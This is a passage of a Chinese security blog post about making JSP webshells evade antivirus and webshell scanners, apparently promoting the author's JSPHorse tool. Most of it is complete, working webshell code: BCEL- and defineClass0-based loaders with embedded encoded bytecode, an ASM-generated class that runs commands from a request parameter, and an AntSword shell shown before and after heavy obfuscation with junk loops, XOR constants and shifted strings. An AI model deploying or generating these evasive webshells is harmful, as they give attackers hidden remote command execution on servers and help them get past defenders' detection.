95$a6$9a2$d5$94$q$82$99$e6$h$H$a0$ff$u$db$89$R$YH$b54$c8$g$92$c7$a6$da$a4Km$9c$f6$5c$s$9a$f7$O$abX$U$k$cf$d5$e4$ff$a0$fd$ef$d9$ea96$cd$c8NU$RG$8f$Z$bf61M$fc4$98$f8z_K$D$BK$82E$v$9a$df$h$a5$a3$daGO$Hw$82$8dd$L$b5$82N$w$j$b7z$b9$b0$bd$f3$ec$92$q$81$e7$t$b5$99$96$db$x$b6_0Ke$cf$f4$83$bci$V$z$7b$5b$98Y$ce$a2$e9x$a1$I$3c$cb5$a3$81$dc$e2$992o$87$8e$eb$84$fbdOx$d5$T$d7$cf$uwZ$5e$B$8dC$b7_$K$F$b1$c4$fcr$d8x$a0$97$e9$da$C$7f$83Z$81V$94$3b$d7$c33$bc$b9$87$f8$JP$f8$e7$n$a2$8c$f1$f9$C$86y$ad$3f$c5$dd$9f$e8$e0$bd$P$dc$i$3b$80r$88$b6$8d$D$c4$W$O$a1n$i$a2$7d$e3$R$3a$c6$x$d0$w$88$l$a0$f3$A$fa$e2d$F$5d$h$d7$d4$df$91$98$YT$x0$S$dd$U$eb$P$k$ff56Q$c1$99$9f$d1$f30J$f04$e504$ca$$$7eJ$M$fe$baq$R$3d0$Jf$g$J$cc$nI$60$f2$bb$U$a5$c6$b3x$O$88$9eF$IQ$a1$ff$U$fd$9f$t$c4$8b$b4$5dB$8a1$t$I$7f$94V$VcQ$vm$8fiT5$8ck$98$d00$a9$e12$f07$G$b8c$g$d0M$c1$L$fc$f3$f6$a0$94$95$9a$5c$r$L$edc$3f$a1$e7$H$3e$b4E8$3b$oe$7f$84$c7$a8$3a$d4$f0t$e2$r$o$ac$d2t$9f$IT$aeW$T$bd$V$9cM$q$wHfH$cd$b9_$e3$L$e3$y$bdo$7dB$7d$84$f3$8b$3f$a2$bf$c6ab$80$cc$90$$$83$bcT0$f8$b0$9eo$88$Z$r$fe$$$d6$92$60$p$G$c8$d40s$bcF$ab$c40V$cd$83W$f0j$c4$df$q$zW$89$xA$3e$5e$c75F$Zf$8c$v$be$jk$w$f4z$94$e1$8d$7f$BP$cbmH$f2$H$A$A";
    Class<?> c = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
    ClassLoader loader = (ClassLoader) c.newInstance();
    Class<?> clazz = loader.loadClass(bcelCode);
    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
    Object obj = constructor.newInstance(cmd);
    response.getWriter().print("");
    response.getWriter().print(obj.toString());
    response.getWriter().print("");
%>
```

处理前的动态构造字节码JSP如下：

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%@ page import="static jdk.internal.org.objectweb.asm.Opcodes.*" %>
<%! String PASSWORD = "4ra1n"; %>
<%
    jdk.internal.org.objectweb.asm.ClassWriter classWriter = new jdk.internal.org.objectweb.asm.ClassWriter(
            jdk.internal.org.objectweb.asm.ClassWriter.COMPUTE_FRAMES);
    jdk.internal.org.objectweb.asm.FieldVisitor fieldVisitor;
    jdk.internal.org.objectweb.asm.MethodVisitor methodVisitor;
    classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, "sample/ByteCodeEvil", null, "java/lang/Object", null);
    fieldVisitor = classWriter.visitField(0, "res", "Ljava/lang/String;", null, null);
    fieldVisitor.visitEnd();
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "(Ljava/lang/String;)V", null, new String[]{"java/io/IOException"});
    methodVisitor.visitCode();
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
    methodVisitor.visitTypeInsn(NEW, "java/lang/StringBuilder");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
    methodVisitor.visitVarInsn(ASTORE, 2);
    methodVisitor.visitTypeInsn(NEW, "java/io/BufferedReader");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitTypeInsn(NEW, "java/io/InputStreamReader");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
    methodVisitor.visitVarInsn(ALOAD, 1);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "getInputStream", "()Ljava/io/InputStream;", false);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/InputStreamReader", "<init>", "(Ljava/io/InputStream;)V", false);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/BufferedReader", "<init>", "(Ljava/io/Reader;)V", false);
    methodVisitor.visitVarInsn(ASTORE, 3);
    jdk.internal.org.objectweb.asm.Label label0 = new jdk.internal.org.objectweb.asm.Label();
    methodVisitor.visitLabel(label0);
    methodVisitor.visitVarInsn(ALOAD, 3);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/BufferedReader", "readLine", "()Ljava/lang/String;", false);
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitVarInsn(ASTORE, 4);
    jdk.internal.org.objectweb.asm.Label label1 = new jdk.internal.org.objectweb.asm.Label();
    methodVisitor.visitJumpInsn(IFNULL, label1);
    methodVisitor.visitVarInsn(ALOAD, 2);
    methodVisitor.visitVarInsn(ALOAD, 4);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
    methodVisitor.visitLdcInsn("\n");
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
    methodVisitor.visitInsn(POP);
    methodVisitor.visitJumpInsn(GOTO, label0);
    methodVisitor.visitLabel(label1);
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitVarInsn(ALOAD, 2);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
    methodVisitor.visitFieldInsn(PUTFIELD, "sample/ByteCodeEvil", "res", "Ljava/lang/String;");
    methodVisitor.visitInsn(RETURN);
    methodVisitor.visitMaxs(6, 5);
    methodVisitor.visitEnd();
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "toString", "()Ljava/lang/String;", null, null);
    methodVisitor.visitCode();
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitFieldInsn(GETFIELD, "sample/ByteCodeEvil", "res", "Ljava/lang/String;");
    methodVisitor.visitInsn(ARETURN);
    methodVisitor.visitMaxs(1, 1);
    methodVisitor.visitEnd();
    classWriter.visitEnd();
    byte[] code = classWriter.toByteArray();
    String cmd = request.getParameter("cmd");
    String pwd = request.getParameter("pwd");
    if (!pwd.equals(PASSWORD)) {
        return;
    }
    String byteCode = com.sun.org.apache.bcel.internal.classfile.Utility.encode(code, true);
    byteCode = "$$BCEL$$" + byteCode;
    Class<?> c = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
    ClassLoader loader = (ClassLoader) c.newInstance();
    Class<?> clazz = loader.loadClass(byteCode);
    java.lang.reflect.Constructor<?> constructor = clazz.getConstructor(String.class);
    Object obj = constructor.newInstance(cmd);
    response.getWriter().print("");
    response.getWriter().print(obj.toString());
    response.getWriter().print("");
%>
```

0x0b defineClass0免杀
-------------------

思路来自**su18**师傅的代码，核心思想是加载字节码执行实现Webshell功能，在工具中实现

由于`defineClass0`是`native`方法，理论上可以绕过一些检测

由于JVM加载了字节码中的某个类，所以该Webshell只有一次执行命令的能力，第二次运行同样的JSP会导致类重复

想要第二次执行必须上传一个字节码的类名不同的Webshell

笔者使用ASM技术实现了随机类名的功能，可以做到每次生成的Webshell的字节码的类名不同

处理前的原版Webshell如下：

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%!
    public static Class<?> defineByProxy(String className, byte[] classBytes) throws Exception {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        java.lang.reflect.Method method = java.lang.reflect.Proxy.class.getDeclaredMethod("defineClass0",
                ClassLoader.class, String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);
        return (Class<?>) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);
    }
%>
<%
    byte[] bytes = new sun.misc.BASE64Decoder().decodeBuffer("yv66vgAAADQAcQoAGwAvBwAwCgACAC8HADEHADIKADMANAoAMwA1CgA2ADcKAAUAOAoABAA5CgAEADoKAAIAOwgAPAoAAgA9CQAQAD4HAD8KAEAAQQgAQgoAQwBECgBFAEYKAEUARwcASAoAFgAvCgAWAEkJAEoASwoATABNBwBOAQADcmVzAQASTGphdmEvbGFuZy9TdHJpbmc7AQAGPGluaXQ+AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAD8HAE8HADAHADEBAApFeGNlcHRpb25zBwBQAQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAKU291cmNlRmlsZQEAEUJ5dGVDb2RlRXZpbC5qYXZhDAAeAFEBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBSDABTAFQMAFUAVgcAVwwAWABZDAAeAFoMAB4AWwwAXAAqDABdAF4BAAEKDAApACoMABwAHQEAGm9yZy9zZWMvc3RhcnQvQnl0ZUNvZGVFdmlsBwBfDABgAGEBABJCeXRlQ29kZUV2aWwuY2xhc3MHAGIMAGMAZAcAZQwAZgBnDABoAGkBABZzdW4vbWlzYy9CQVNFNjRFbmNvZGVyDABqAGsHAGwMAG0AbgcAbwwAcAAfAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQADKClWAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAD2phdmEvbGFuZy9DbGFzcwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAE2dldFJlc291cmNlQXNTdHJlYW0BACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAlhdmFpbGFibGUBAAMoKUkBAARyZWFkAQAFKFtCKUkBAAxlbmNvZGVCdWZmZXIBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuACEAEAAbAAAAAQAAABwAHQAAAAMAAQAeAB8AAgAgAAAAnAAGAAUAAABHKrcAAbsAAlm3AANNuwAEWbsABVm4AAYrtgAHtgAItwAJtwAKTi22AAtZOgTGABIsGQS2AAwSDbYADFen/+oqLLYADrUAD7EAAAACACEAAAAiAAgAAAAMAAQADQAMAA4AFAAPACUAEQAvABIAPgAUAEYAFQAiAAAAGwAC/wAlAAQHACMHACQHACUHACYAAPwAGAcAJAAnAAAABAABACgAAQApACoAAQAgAAAAHQABAAEAAAAFKrQAD7AAAAABACEAAAAGAAEAAAAYAAkAKwAsAAIAIAAAAGAAAgAFAAAAMBIQtgAREhK2ABNMK7YAFLwITSsstgAVV7sAFlm3ABdOLSy2ABg6BLIAGRkEtgAasQAAAAEAIQAAAB4ABwAAABwACwAdABIAHgAYAB8AIAAgACcAIQAvACIAJwAAAAQAAQAoAAEALQAAAAIALg==");
    Class<?> testClass = defineByProxy("org/sec/start/ByteCodeEvil", bytes);
    Object result = testClass.getConstructor(String.class).newInstance(request.getParameter("cmd"));
    out.print("");
    out.println(result.toString());
    out.print("");
%>
```

其中的字节码是该类，一个普通类，在构造方法中实现简单的回显Webshell

如果该类被实例化就会执行命令，实现Webshell的功能

```java
public class ByteCodeEvil {
    String res;

    public ByteCodeEvil(String cmd) throws IOException {
        StringBuilder stringBuilder = new StringBuilder();
        BufferedReader bufferedReader = new BufferedReader(
                new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        this.res = stringBuilder.toString();
    }

    public String toString() {
        return this.res;
    }
}
```

为何不直接构造字节码，然后加载执行实现Webshell呢

于是笔者用JDK自带的ASM实现了`ByteCodeEvil`类

（注意一定要用自带ASM，因为目标机器一定有JDK但不一定有第三方依赖库）

处理前的原版Webshell如下：

```java
<%@ page language="java" pageEncoding="UTF-8" %>
<%!
    public static Class<?> defineByProxy(String className, byte[] classBytes) throws Exception {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        java.lang.reflect.Method method = java.lang.reflect.Proxy.class.getDeclaredMethod("defineClass0",
                ClassLoader.class, String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);
        return (Class<?>) method.invoke(null, classLoader, className, classBytes, 0, classBytes.length);
    }
%>
<%@ page import="static jdk.internal.org.objectweb.asm.Opcodes.*" %>
<%
    jdk.internal.org.objectweb.asm.ClassWriter classWriter = new jdk.internal.org.objectweb.asm.ClassWriter(
            jdk.internal.org.objectweb.asm.ClassWriter.COMPUTE_FRAMES);
    jdk.internal.org.objectweb.asm.FieldVisitor fieldVisitor;
    jdk.internal.org.objectweb.asm.MethodVisitor methodVisitor;
    classWriter.visit(V1_8, ACC_PUBLIC | ACC_SUPER, "sample/ByteCodeEvil", null, "java/lang/Object", null);
    fieldVisitor = classWriter.visitField(0, "res", "Ljava/lang/String;", null, null);
    fieldVisitor.visitEnd();
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "<init>", "(Ljava/lang/String;)V", null, new String[]{"java/io/IOException"});
    methodVisitor.visitCode();
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
    methodVisitor.visitTypeInsn(NEW, "java/lang/StringBuilder");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
    methodVisitor.visitVarInsn(ASTORE, 2);
    methodVisitor.visitTypeInsn(NEW, "java/io/BufferedReader");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitTypeInsn(NEW, "java/io/InputStreamReader");
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitMethodInsn(INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
    methodVisitor.visitVarInsn(ALOAD, 1);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Process", "getInputStream", "()Ljava/io/InputStream;", false);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/InputStreamReader", "<init>", "(Ljava/io/InputStream;)V", false);
    methodVisitor.visitMethodInsn(INVOKESPECIAL, "java/io/BufferedReader", "<init>", "(Ljava/io/Reader;)V", false);
    methodVisitor.visitVarInsn(ASTORE, 3);
    jdk.internal.org.objectweb.asm.Label label0 = new jdk.internal.org.objectweb.asm.Label();
    methodVisitor.visitLabel(label0);
    methodVisitor.visitVarInsn(ALOAD, 3);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/io/BufferedReader", "readLine", "()Ljava/lang/String;", false);
    methodVisitor.visitInsn(DUP);
    methodVisitor.visitVarInsn(ASTORE, 4);
    jdk.internal.org.objectweb.asm.Label label1 = new jdk.internal.org.objectweb.asm.Label();
    methodVisitor.visitJumpInsn(IFNULL, label1);
    methodVisitor.visitVarInsn(ALOAD, 2);
    methodVisitor.visitVarInsn(ALOAD, 4);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
    methodVisitor.visitLdcInsn("\n");
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
    methodVisitor.visitInsn(POP);
    methodVisitor.visitJumpInsn(GOTO, label0);
    methodVisitor.visitLabel(label1);
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitVarInsn(ALOAD, 2);
    methodVisitor.visitMethodInsn(INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
    methodVisitor.visitFieldInsn(PUTFIELD, "sample/ByteCodeEvil", "res", "Ljava/lang/String;");
    methodVisitor.visitInsn(RETURN);
    methodVisitor.visitMaxs(6, 5);
    methodVisitor.visitEnd();
    methodVisitor = classWriter.visitMethod(ACC_PUBLIC, "toString", "()Ljava/lang/String;", null, null);
    methodVisitor.visitCode();
    methodVisitor.visitVarInsn(ALOAD, 0);
    methodVisitor.visitFieldInsn(GETFIELD, "sample/ByteCodeEvil", "res", "Ljava/lang/String;");
    methodVisitor.visitInsn(ARETURN);
    methodVisitor.visitMaxs(1, 1);
    methodVisitor.visitEnd();
    classWriter.visitEnd();
    byte[] code = classWriter.toByteArray();
    Class<?> testClass = defineByProxy("sample/ByteCodeEvil", code);
    Object result = testClass.getConstructor(String.class).newInstance(request.getParameter("cmd"));
    out.print("");
    out.println(result.toString());
    out.print("");
%>
```

注意该Webshell和上文一样，只能执行一次

如果想多次执行，需要类名不同，而这里实现类名不同非常简单，修改`sample/ByteCodeEvil`即可

0x0c 蚁剑免杀处理
-----------

笔者尝试用了以上的方法（**0x02**-**0x05**）和花指令等其他小手段，最后实现了蚁剑Webshell的处理，不知道免杀效果如何

处理前的原版Webshell如下：

```java
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

处理后

```java
<%!
    class VGakJDyicU extends ClassLoader {
        VGakJDyicU(ClassLoader sjqhdnqocals) {
            super(sjqhdnqocals);
            for (int ZCzmllUXtVEeZskSMJEz = (1263180 ^ 1263180); ZCzmllUXtVEeZskSMJEz < (1863338 ^ 1863328); ZCzmllUXtVEeZskSMJEz++) {
                if (ZCzmllUXtVEeZskSMJEz == (1988769 ^ 1988776)) {
                    break;
                }
            }
        }

        private int dsaENLANCL() {
            for (int yoMmmGPWAtcOBiAgCUWX = ((259959 ^ 1197627) ^ (206306 ^ 1217710)); yoMmmGPWAtcOBiAgCUWX < ((343431 ^ 1794195) ^ (966919 ^ 1088537)); yoMmmGPWAtcOBiAgCUWX++) {
                if (yoMmmGPWAtcOBiAgCUWX == ((134011 ^ 1675804) ^ (770157 ^ 1071363))) {
                    break;
                }
            }
            return ((485255 ^ 1246863) ^ (156062 ^ 1441942));
        }

        public Class qwer(byte[] dqwbdjk) {
            if (dqwbdjk.length == ((2069908 ^ 1078641) ^ (1784881 ^ 1367216))) {
                for (int GsuWImCilISonbpTyZui = ((636131 ^ 1142979) ^ (124627 ^ 1647347)); GsuWImCilISonbpTyZui < ((579438 ^ 1670906) ^ (348300 ^ 1374482)); GsuWImCilISonbpTyZui++) {
                    if (GsuWImCilISonbpTyZui == ((13479 ^ 1889100) ^ (611430 ^ 1422212))) {
                        break;
                    }
                }
            }
            int ercCqJlVzFqfCyrEabcm = dqwbdjk.length;
            if (ercCqJlVzFqfCyrEabcm > ((330429 ^ 1925916) ^ (741991 ^ 1260492))) {
                for (int llcdjrZGNEWQaALQAsUR = ((207275 ^ 1682785) ^ (184435 ^ 1594553)); llcdjrZGNEWQaALQAsUR < ((206607 ^ 1213855) ^ (1981517 ^ 1023703)); llcdjrZGNEWQaALQAsUR++) {
                    if (llcdjrZGNEWQaALQAsUR == ((328245 ^ 1533470) ^ (510359 ^ 1420725))) {
                        break;
                    }
                }
            }
            byte[] YwAvyJBZdbTBZbQhcBwH = dqwbdjk;
            Class TaoMNcEEzcdFDzvxRtCB = super.defineClass(YwAvyJBZdbTBZbQhcBwH, ((396500 ^ 1437237) ^ (289123 ^ 1543042)), YwAvyJBZdbTBZbQhcBwH.length);
            if (TaoMNcEEzcdFDzvxRtCB.isInterface()) {
                TaoMNcEEzcdFDzvxRtCB.getName();
            }
            return TaoMNcEEzcdFDzvxRtCB;
        }
    }
%><%!
    public static byte[] base64Decode(String str) throws Exception {
        String[] globalArr = new String[]{"c3VuLm1pc2MuQkFTRTY0RGVjb2Rlcg==", "aGlnc2hpRnlqaml2", "amF2YS51dGlsLkJhc2U2NA==", "a2l4SGlnc2hpdg==", "aGlnc2hp"};
        try {
            Class clazz = Class.forName(dec(globalArr[((0 ^ 1345535) ^ (715040 ^ 1994463))], ((600797 ^ 1524742) ^ (207413 ^ 1918186))));
            return (byte[]) clazz.getMethod(dec(globalArr[((948015 ^ 1651496) ^ (182287 ^ 1412105))], ((769795 ^ 1506285) ^ (688088 ^ 1522482))), String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName(dec(globalArr[((797587 ^ 1382585) ^ (127362 ^ 1622698))], ((582194 ^ 1928767) ^ (636958 ^ 1848343))));
            Object decoder = clazz.getMethod(dec(globalArr[((664470 ^ 1890424) ^ (1680902 ^ 1007083))], ((1485 ^ 1523451) ^ (346165 ^ 1209095)))).invoke(null);
            return (byte[]) decoder.getClass().getMethod(dec(globalArr[((554945 ^ 1929084) ^ (225411 ^ 1468474))], ((682491 ^ 1223509) ^ (148392 ^ 1736962))), String.class).invoke(decoder, str);
        }
    }
%><%!
    public static String dec(String str, int offset) {
        try {
            byte[] MQgbKJrvmvUNiACWzYhP = new sun.misc.BASE64Decoder().decodeBuffer(str);
            str = new String(MQgbKJrvmvUNiACWzYhP);
            char rKfCgregXvByjCvhxRxW;
            StringBuilder UJmcHvuZzxZueglvhEXj = new StringBuilder();
            for (int IEQwwpVvaGzMUAxhssQF = (1825797 ^ 1825797); IEQwwpVvaGzMUAxhssQF < str.length(); IEQwwpVvaGzMUAxhssQF++) {
                rKfCgregXvByjCvhxRxW = str.charAt(IEQwwpVvaGzMUAxhssQF);
                if (rKfCgregXvByjCvhxRxW >= 'a' && rKfCgregXvByjCvhxRxW <= 'z') {
                    rKfCgregXvByjCvhxRxW = (char) (((rKfCgregXvByjCvhxRxW - 'a') - offset + (1474946 ^ 1474968)) % (1398627 ^ 1398649) + 'a');
                } else if (rKfCgregXvByjCvhxRxW >= 'A' && rKfCgregXvByjCvhxRxW <= 'Z') {
                    rKfCgregXvByjCvhxRxW = (char) (((rKfCgregXvByjCvhxRxW - 'A') - offset + (1850740 ^ 1850734)) % (1084508 ^ 1084486) + 'A');
                } else if (rKfCgregXvByjCvhxRxW >= '0' && rKfCgregXvByjCvhxRxW <= '9') {
                    rKfCgregXvByjCvhxRxW = (char) (((rKfCgregXvByjCvhxRxW - '0') - offset + (1210262 ^ 1210268)) % (1307501 ^ 1307495) + '0');
                } else {
                    UJmcHvuZzxZueglvhEXj = new StringBuilder(str);
                    break;
                }
                UJmcHvuZzxZueglvhEXj.append(rKfCgregXvByjCvhxRxW);
            }
            String DqvcAOdAcpWauApzwTRq = UJmcHvuZzxZueglvhEXj.toString();
            DqvcAOdAcpWauApzwTRq = DqvcAOdAcpWauApzwTRq.replace("\\\"", "\"");
            DqvcAOdAcpWauApzwTRq = DqvcAOdAcpWauApzwTRq.replace("\\n", "\n");
            return DqvcAOdAcpWauApzwTRq;
        } catch (Exception ignored) {
            return "";
        }
    }
%><%
    String[] oNJuJikOgjxSAgpuapoa = new String[]{"MXw2fDExfDB8MTJ8N3w1fDl8MTN8NHwzfDJ8OHwxMA==", "eWpiYmZtbQ=="};
    String ckphsywtqiXvMyIouIdk = dec(oNJuJikOgjxSAgpuapoa[((0 ^ 1454308) ^ (144559 ^ 1311819))], ((842141 ^ 1629663) ^ (862872 ^ 1650387)));
    String[] FcuXNygiqPJbDZwvnlSg = ckphsywtqiXvMyIouIdk.split("\\|");
    String dmjXOSyFxLGKfPNJeVkE = null;
    ClassLoader jKpxyUZqKneUsfmnxTlC = null;
    VGakJDyicU QTZxUuEMsBJWRNcudHyD = null;
    byte[] fOusiCauDCKbMzDlKvqw = null;
    Class AAsWwIQGRxHfKbdqLZev = null;
    Object BYaCKDJJsTfIPkqUyKoL = null;
    int YvkdhaCbnCbPDaUNRuBo = ((187401 ^ 1704406) ^ (1008132 ^ 1556443));
    while (YvkdhaCbnCbPDaUNRuBo < ((319511 ^ 1953485) ^ (612423 ^ 1078932))) {
        int cTJfJkZQDeaXOYYzRNnC = Integer.parseInt(FcuXNygiqPJbDZwvnlSg[YvkdhaCbnCbPDaUNRuBo++]);
        switch (cTJfJkZQDeaXOYYzRNnC) {
            case ((664766 ^ 1058149) ^ (44698 ^ 1748812)):
                for (int OxJhcBTqssMVndvyMIjo = ((309873 ^ 1246634) ^ (241737 ^ 1314706)); OxJhcBTqssMVndvyMIjo < ((333641 ^ 1628558) ^ (832090 ^ 1146007)); OxJhcBTqssMVndvyMIjo++) {
                    if (OxJhcBTqssMVndvyMIjo == ((861272 ^ 1921733) ^ (635827 ^ 1688871))) {
                        break;
                    }
                }
                break;
            case ((122212 ^ 1235151) ^ (468463 ^ 1318981)):
                dmjXOSyFxLGKfPNJeVkE = request.getParameter(dec(oNJuJikOgjxSAgpuapoa[((69673 ^ 1384378) ^ (410020 ^ 1199670))], ((115978 ^ 1645709) ^ (996168 ^ 1567430))));
                break;
            case ((1002251 ^ 1980313) ^ (29403 ^ 1117772)):
                BYaCKDJJsTfIPkqUyKoL = AAsWwIQGRxHfKbdqLZev.newInstance();
                break;
            case ((520420 ^ 1745450) ^ (7204 ^ 1920737)):
                jKpxyUZqKneUsfmnxTlC = this.getClass().getClassLoader();
                break;
            case ((167948 ^ 1791275) ^ (393195 ^ 1850060)):
                QTZxUuEMsBJWRNcudHyD = new VGakJDyicU(jKpxyUZqKneUsfmnxTlC);
                break;
            case ((327792 ^ 1385753) ^ (860610 ^ 1901735)):
                fOusiCauDCKbMzDlKvqw = base64Decode(dmjXOSyFxLGKfPNJeVkE);
                break;
            case ((944603 ^ 1361552) ^ (529251 ^ 1227823)):
                AAsWwIQGRxHfKbdqLZev = QTZxUuEMsBJWRNcudHyD.qwer(fOusiCauDCKbMzDlKvqw);
                break;
            case ((1757191 ^ 1036219) ^ (30436 ^ 1403230)):
                if (dmjXOSyFxLGKfPNJeVkE == null) {
                    return;
                }
                break;
            case ((361224 ^ 1559863) ^ (259966 ^ 1161544)):
                BYaCKDJJsTfIPkqUyKoL.equals(pageContext);
                break;
        }
    }
%>
```

0x0e 总结
-------

以上的免杀手段是否真正有用，笔者并不是很确定，因为已有的线上webshell查杀平台强度似乎不高

代码地址在：<https://github.com/EmYiQing/JSPHorse>

没想到不到一周已有400左右的Star，有点受宠若惊

最终总结下，其实在已有的免杀技术上加入混淆技术不一定能够提高免杀能力，因为例如`method.invoke`等关键类和方法的调用并没有改变，但这也是一种尝试，或许可以绕过一些基于模拟执行的检测，也可以增加防御方审计分析的成本